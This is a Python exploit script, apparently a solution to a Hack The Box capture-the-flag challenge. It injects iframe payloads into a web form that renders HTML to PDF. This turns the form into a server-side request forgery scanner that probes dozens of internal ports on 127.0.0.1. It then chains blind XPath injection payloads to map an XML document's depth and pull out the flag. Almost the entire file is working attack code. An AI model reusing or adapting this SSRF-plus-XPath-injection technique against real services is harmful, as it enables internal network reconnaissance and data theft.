import requests
from PyPDF2 import PdfReader
import re

web_ports_tcp =[80,443,8009,8180,81,300,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017]
file = open('exploit.pdf','wb')
def find_internal_web_applications(file):
    for i in web_ports_tcp:
        data = {"id":"134",'title':'123',"desc":f"<iframe style='z-index: 10; position: relative; top: -200px; left:-100; width:500; height:800;' src='http://127.0.0.1:{i}/'></iframe>",'comment':'1'}
        respuesta = requests.post('http://94.237.55.38:55429/order.php',data=data)
        if 'Failed to load' not in respuesta.text:
            print(f"Se tiene una aplicacion web interna ejecutandose en el puerto {i}")
            file.write(respuesta.content)
            print("Se ha generado el archivo 'exploit.pdf' en su directorio actual con el iframe que contiene la pagina de inicio de dicha aplicacion")
            return i

def niveles_esquemaXML(puerto,file):
        payload = ""
        contador = 0
        while(True):
            payload = payload+"/*[1]"
            data = {"id":"134",'title':'123',"desc":f"<iframe style='z-index: 10; position: relative; top: -200px; left:-100; width:500; height:800;' src='http://127.0.0.1:{puerto}/index.php?q=1337 and 1=2]|{payload}%00'></iframe>",'comment':'1'}
            respuesta = requests.post('http://94.237.55.38:55429/order.php',data=data)
            file.write(respuesta.content)
            reader = PdfReader("exploit.pdf")
            texto = (reader.pages[0]).extract_text()
            if 'No Results!' in texto:
                 print(f"El nivel de profundidad del documento XML es {contador-1}")
                 return contador-1
            contador +=1

def exfiltracion_flag(niveles,puerto,file):
    payload =['/*[1]']*niveles
    copia = payload.copy()
    for i in range(1,len(payload)):
        for j in range(2,10):
            payload[i]=f'/*[{j}]'
            payload_resultante = ''.join(payload)
            data = {"id":"134",'title':'123',"desc":f"<iframe style='z-index: 10; position: relative; top: -200px; left:-100; width:500; height:800;' src='http://127.0.0.1:{puerto}/index.php?q=1337 and 1=2]|{payload_resultante}%00'></iframe>",'comment':'1'}
            respuesta = requests.post('http://94.237.55.38:55429/order.php',data=data)
            file.write(respuesta.content)
            reader = PdfReader("exploit.pdf")
            texto = (reader.pages[0]).extract_text()
            if 'HTB' in texto:
                 resultado = re.findall('HTB.*',texto)
                 print(f"La flag viene a ser {resultado[0]}")
                 return
        payload = copia.copy()

puerto = find_internal_web_applications(file)
niveles = niveles_esquemaXML(puerto,file)
exfiltracion_flag(niveles,puerto,file)
